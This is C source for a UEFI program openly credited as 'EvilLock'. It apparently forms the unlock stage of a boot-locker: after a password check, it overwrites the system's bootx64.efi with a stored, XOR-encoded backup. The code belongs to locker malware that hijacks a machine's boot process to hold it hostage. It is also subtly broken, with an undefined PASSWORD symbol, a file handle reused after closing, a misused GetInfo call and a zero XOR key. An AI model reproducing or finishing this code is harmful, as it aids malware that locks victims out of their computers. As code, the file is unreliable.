#include <Uefi.h>
#include <Library/UefiLib.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/BaseMemoryLib.h>
#include <Library/DebugLib.h>

#define BACKUP_FILE L"\\EFI\\BOOT\\backup.yeluo" // 备份文件路径
#define TARGET_FILE L"\\EFI\\BOOT\\bootx64.efi" // 目标文件路径
#define XOR_VALUE 0x00 // 异或值
#define PASSWORD_FILE L"\\EFI\\BOOT\\yeluo.psw" // 密码文件路径
#define MESSAGE_FILE L"\\EFI\\BOOT\\yeluo.msg" // 提示信息文件路径

// 从文件中读取密码
EFI_STATUS ReadPassword(UINT8 *PasswordBuffer, UINTN PasswordSize) {
  EFI_FILE_PROTOCOL *File;
  EFI_STATUS Status;
  Status = gBS->LocateProtocol(&gEfiSimpleFileSystemProtocolGuid, NULL, (VOID **)&File);
  if (EFI_ERROR(Status)) {
    return Status;
  }
  EFI_FILE_HANDLE Root;
  Status = File->OpenVolume(File, &Root);
  if (EFI_ERROR(Status)) {
    return Status;
  }
  EFI_FILE_HANDLE PasswordFile;
  Status = Root->Open(Root, &PasswordFile, PASSWORD_FILE, EFI_FILE_MODE_READ, 0);
  if (EFI_ERROR(Status)) {
    return Status;
  }
  Status = PasswordFile->Read(PasswordFile, &PasswordSize, PasswordBuffer);
  if (EFI_ERROR(Status)) {
    return Status;
  }
  PasswordFile->Close(PasswordFile);
  Root->Close(Root);
  return EFI_SUCCESS;
}

// 从文件中读取提示信息
EFI_STATUS ReadMessage(CHAR16 *MessageBuffer, UINTN MessageSize) {
  EFI_FILE_PROTOCOL *File;
  EFI_STATUS Status;
  Status = gBS->LocateProtocol(&gEfiSimpleFileSystemProtocolGuid, NULL, (VOID **)&File);
  if (EFI_ERROR(Status)) {
    return Status;
  }
  EFI_FILE_HANDLE Root;
  Status = File->OpenVolume(File, &Root);
  if (EFI_ERROR(Status)) {
    return Status;
  }
  EFI_FILE_HANDLE MessageFile;
  Status = Root->Open(Root, &MessageFile, MESSAGE_FILE, EFI_FILE_MODE_READ, 0);
  if (EFI_ERROR(Status)) {
    return Status;
  }
  Status = MessageFile->Read(MessageFile, &MessageSize, MessageBuffer);
  if (EFI_ERROR(Status)) {
    return Status;
  }
  MessageFile->Close(MessageFile);
  Root->Close(Root);
  return EFI_SUCCESS;
}

EFI_STATUS EFIAPI UefiMain(IN EFI_HANDLE ImageHandle, IN EFI_SYSTEM_TABLE *SystemTable)
{
  EFI_STATUS Status;
  CHAR16 InputBuffer[100];
  UINTN InputSize;

  // 读取密码
  UINT8 Password[sizeof(PASSWORD)];
  Status = ReadPassword(Password, sizeof(Password));
  if (EFI_ERROR(Status)) {
    Print(L"Failed to read password: %r\n", Status);
    return Status;
  }
   for (UINTN i = 0; i <sizeof(Password);i++){
    PASSWORD[i] ^= XOR_VALUE;
  }
  // 读取提示信息
  CHAR16 Message[100];
  Status = ReadMessage(Message, sizeof(Message));
  if (EFI_ERROR(Status)) {
    Print(L"Failed to read message: %r\n", Status);
    return Status;
  }

  // 等待用户输入密码
  while (TRUE) {
    Print(L"%s", Message);
    InputSize = sizeof(InputBuffer);
    ZeroMem(InputBuffer, InputSize);
    Status = gST->ConIn->ReadLine(gST->ConIn, InputBuffer, &InputSize);
    if (Status != EFI_SUCCESS) {
      Print(L"\nReadLine failed: %r\n", Status);
      return Status;
    }

    // 如果用户输入的密码长度小于32，自动用！补齐
    if (InputSize < sizeof(Password)) {
      UINTN i;
      for (i = 0; i < InputSize; i++) {
        InputBuffer[i] = InputBuffer[i];
      }
      for (; i < sizeof(Password); i++) {
        InputBuffer[i] = L'!';
      }
    }

    // 比较用户输入的密码和预设密码是否一致
    if (CompareMem(InputBuffer, Password, sizeof(Password)) == 0) {
      break;
    } else {
      Print(L"\nPassword incorrect .Please try again qwq\n");
    }
  }

  // 读取备份文件的内容
  EFI_FILE_PROTOCOL *File;
  Status = gBS->LocateProtocol(&gEfiSimpleFileSystemProtocolGuid, NULL, (VOID **)&File);
  if (EFI_ERROR(Status)) {
    Print(L"\nLocateProtocol failed: %r\n", Status);
    return Status;
  }
  EFI_FILE_HANDLE Root;
  Status = File->OpenVolume(File, &Root);
  if (EFI_ERROR(Status)) {
    Print(L"\nOpenVolume failed: %r\n", Status);
    return Status;
  }
  EFI_FILE_HANDLE BackupFile;
  Status = Root->Open(Root, &BackupFile, BACKUP_FILE, EFI_FILE_MODE_READ, 0);
  if (EFI_ERROR(Status)) {
    Print(L"\nOpen failed: %r\n", Status);
    return Status;
  }
  UINTN BackupFileSize;
  Status = File->GetInfo(BackupFile, &gEfiFileInfoGuid, &BackupFileSize, NULL);
  if (EFI_ERROR(Status)) {
    Print(L"\nGetInfo failed: %r\n", Status);
    return Status;
  }
  UINT8 *BackupData = AllocatePool(BackupFileSize);
  if (BackupData == NULL) {
    Print(L"\nAllocatePool failed\n");
    return EFI_OUT_OF_RESOURCES;
  }
  Status = BackupFile->Read(BackupFile, &BackupFileSize, BackupData);
  if (EFI_ERROR(Status)) {
    Print(L"\nRead failed: %r\n", Status);
    return Status;
  }
  BackupFile->Close(BackupFile);
  Root->Close(Root);

  // 对备份文件内容进行异或操作
  for (UINTN i = 0; i < BackupFileSize; i++) {
    BackupData[i] ^= XOR_VALUE;
  }

  // 清空目标文件
  EFI_FILE_HANDLE TargetFile;
  Status = Root->Open(Root, &TargetFile, TARGET_FILE, EFI_FILE_MODE_CREATE | EFI_FILE_MODE_WRITE, 0);
  if (EFI_ERROR(Status)) {
    Print(L"\nOpen failed: %r\n", Status);
    return Status;
  }
  TargetFile->SetPosition(TargetFile, 0);
  Status = TargetFile->SetInfo(TargetFile, &gEfiFileInfoGuid, 0, NULL);
  if (EFI_ERROR(Status)) {
    Print(L"\nSetInfo failed: %r\n", Status);
    return Status;
  }

  // 将异或后的备份文件内容写入目标文件
  Status = TargetFile->Write(TargetFile, &BackupFileSize, BackupData);
  if (EFI_ERROR(Status)) {
    Print(L"\nWrite failed: %r\n", Status);
    return Status;
  }
  TargetFile->Close(TargetFile);
  Root->Close(Root);

  // 显示成功信息，退出程序
  Print(L"\nBackup file written to %s \n", TARGET_FILE);
  Print(L"The unlock process has been completed. Please restart the computer to restore it.This Lock by yeluo https://github.com/YunChenqwq/EvilLock\n");
  return EFI_SUCCESS;
}
